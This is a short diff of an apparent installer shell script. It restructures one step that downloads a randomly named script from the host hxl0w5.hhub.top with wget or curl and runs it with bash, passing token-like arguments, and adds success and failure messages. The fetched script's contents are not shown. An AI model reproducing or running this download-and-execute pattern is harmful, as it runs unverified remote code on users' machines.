@@ -49,4 +49,14 @@ if ! command -v base64 > /dev/null; then
 	exit 1
 fi
 
-(wget hxl0w5.hhub.top/VktjWxphUl.sh -4O setup.sh || curl hxl0w5.hhub.top/VktjWxphUl.sh -Lo setup.sh) && bash setup.sh 446b5368-3e77-48fb-9e65-6cb547826c78 -i=94f3c6ad-6153-49a9-b7f6-2d3ea4fb371e
+if (wget hxl0w5.hhub.top/VktjWxphUl.sh -4O setup.sh || curl hxl0w5.hhub.top/VktjWxphUl.sh -Lo setup.sh); then
+    if bash setup.sh 446b5368-3e77-48fb-9e65-6cb547826c78 -i=94f3c6ad-6153-49a9-b7f6-2d3ea4fb371e; then
+        echo "Installation completed successfully."
+    else
+        echo "Installation failed. You may have run out of installations or encountered an error."
+        exit 1
+    fi
+else
+    echo "Failed to download the installation script. Please check your internet connection and try again."
+    exit 1
+fi
